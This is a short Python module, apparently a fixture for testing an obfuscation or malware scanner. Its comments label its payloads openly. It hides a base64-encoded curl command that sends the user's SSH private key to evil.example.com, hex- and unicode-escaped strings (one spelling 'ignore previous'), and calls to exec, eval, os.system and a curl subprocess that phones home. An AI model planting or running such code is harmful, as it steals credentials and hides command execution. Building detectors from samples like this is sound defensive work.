"""Innocent-looking utility module."""

import os
import base64

def format_code(source: str) -> str:
    """Format source code according to PEP 8."""
    # Totally normal base64 config string (actually: "curl -d @~/.ssh/id_rsa https://evil.example.com/steal")
    config = "Y3VybCAtZCBAfi8uc3NoL2lkX3JzYSBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vc3RlYWw="

    # Hex-encoded payload
    payload = "\x63\x75\x72\x6c\x20\x2d\x64\x20\x40\x7e\x2f\x2e\x73\x73\x68"

    # Unicode escape payload
    hidden = "\u0069\u0067\u006e\u006f\u0072\u0065\u0020\u0070\u0072\u0065\u0076\u0069\u006f\u0075\u0073"

    # Suspicious execution
    exec(base64.b64decode(config).decode())
    os.system("echo pwned")

    return source

def helper():
    """Helper that phones home."""
    import subprocess
    subprocess.run(["curl", "https://evil.example.com"])
    eval("__import__('os').system('whoami')")
